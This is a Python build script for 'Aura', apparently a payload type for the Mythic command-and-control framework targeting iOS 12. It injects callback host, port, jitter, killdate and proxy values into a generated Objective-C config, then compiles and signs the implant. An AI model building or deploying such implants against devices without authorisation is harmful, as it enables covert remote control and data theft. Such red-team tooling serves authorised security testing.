from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import subprocess


class Aura(PayloadType):
    name = "Aura"
    file_extension = ""
    author = "@brandon7CC"
    supported_os = [SupportedOS.IOS]
    wrapper = False
    wrapped_payloads = []
    note = """Objective-C payload supporting iOS 12."""
    supports_dynamic_loading = False
    c2_profiles = ["http"]
    mythic_encrypts = True
    translation_container = None
    build_parameters = []
    agent_path = pathlib.Path(".") / "aura"
    agent_icon_path = agent_path / "agent_functions" / "Microsoft_logo.svg"
    agent_code_path = agent_path / "agent_code"

    build_path = agent_path / "build"
    aura_payload_path = build_path / "aura_payload"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Making sure all commands have backing files on disk"),
        BuildStep(step_name="Compiling and Linking Objective-C", step_description="Compiling and linking the payload for iOS."),
        BuildStep(step_name="Signing entitlements", step_description="Signing entitlements to the payload."),
        BuildStep(step_name="Configuring", step_description="Stamping in configuration values")
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            sdk_path = "/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk"
            clang_compiler_path = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang"
            objc_flags = "-x objective-c -fobjc-arc -std=gnu11"

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Successfully gathered Aura sources",
                StepSuccess=True
            ))

            # Extract C2 parameters
            params = self.c2info[0].get_parameters_dict()
            headers = params.get("headers", {})
            callback_host = params.get("callback_host", "localhost")
            callback_port = params.get("callback_port", 80)
            callback_interval = params.get("callback_interval", 10)
            callback_jitter = params.get("callback_jitter", 23)
            killdate = params.get("killdate", "2025-09-18")

            print(f"\n\nPARAMS: {params}\n\n")

            # Dynamically create the HTTPC2Config.m file with the config values injected
            config_objc_code = f"""
#import "HTTPC2Config.h"

@implementation HTTPC2Config

+ (NSString *)AESPSKEncKey {{
    return @"";
}}

+ (NSString *)AESPSKDecKey {{
    return @"";
}}

+ (NSString *)AESPSKValue {{
    return @"";
}}

+ (NSString *)callbackHost {{
    return @"{callback_host}";
}}

+ (NSInteger)callbackPort {{
    return {callback_port};
}}

+ (NSInteger)callbackInterval {{
    return {callback_interval};
}}

+ (NSInteger)callbackJitter {{
    return {callback_jitter};
}}

+ (NSString *)killdate {{
    return @"{killdate}";
}}

+ (NSDictionary *)headers {{
    return @{{
        {"".join([f'@\"{k}\": @\"{v}\", ' for k, v in headers.items()])}
    }};
}}

+ (NSString *)payloadUUID {{
    return @"{self.uuid}";  // Inject the Mythic Payload UUID here
}}

+ (BOOL)encryptedExchangeCheck {{
    return {str(params.get("encrypted_exchange_check", "NO")).lower()};
}}

+ (NSString *)getURI {{
    return @"{params.get("get_uri", "index")}";
}}

+ (NSString *)postURI {{
    return @"{params.get("post_uri", "agent_message")}";
}}

+ (NSString *)proxyHost {{
    return @"{params.get("proxy_host", "")}";
}}

+ (NSString *)proxyPass {{
    return @"{params.get("proxy_pass", "")}";
}}

+ (NSString *)proxyPort {{
    return @"{params.get("proxy_port", "")}";
}}

+ (NSString *)proxyUser {{
    return @"{params.get("proxy_user", "")}";
}}

+ (NSString *)queryPathName {{
    return @"{params.get("query_path_name", "query")}";
}}

@end
"""

            # Write this dynamically generated Objective-C file to the c2_profiles directory
            with open(f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m", 'w') as objc_file:
                objc_file.write(config_objc_code)


            os.makedirs(f"{self.build_path}", exist_ok=True)

            # Function to run commands
            async def run_command(command, step_name):
                process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()

                if process.returncode != 0:
                    print(f"Error during {step_name}:\n{stderr.decode()}")
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName=step_name,
                        StepStdout=f"Failed to {step_name}",
                        StepSuccess=False
                    ))
                    resp.set_status(BuildStatus.Error)
                    resp.build_message = f"Error during {step_name}:\n{stderr.decode()}"
                    return resp
                else:
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName=step_name,
                        StepStdout=f"Successfully {step_name}",
                        StepSuccess=True
                    ))

            compile_link_cmd = (
                f"{clang_compiler_path} {objc_flags} "
                f"-target arm64-apple-ios12.0 -v "
                f"-isysroot {sdk_path} "
                f"-I {self.agent_code_path}/c2_profiles "
                f"{self.agent_code_path}/main.m "
                f"{self.agent_code_path}/C2CheckIn.m "
                f"{self.agent_code_path}/c2_profiles/HTTPC2Config.m "
                f"{self.agent_code_path}/SystemInfoHelper.m "
                f"{self.agent_code_path}/C2Task.m "
                f"-framework Foundation -framework UIKit -lobjc "
                f"-o {self.aura_payload_path} "
            )

            print(compile_link_cmd)
            await run_command(compile_link_cmd, "Compiling and Linking Objective-C")

            # Sign the payload
            entitlements_file = self.agent_code_path / "base_entitlements.plist"
            codesign_command = f"codesign -s - --entitlements {entitlements_file} --force --timestamp=none {self.aura_payload_path}"
            await run_command(codesign_command, "Signing payload")
            if os.path.exists(self.aura_payload_path):
                    resp.payload = open(self.aura_payload_path, "rb").read()
            resp.build_message = "Successfully built and signed Aura payload!"
            resp.status = BuildStatus.Success

            return resp

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_message = f"Exception: {str(e)}"

        return resp
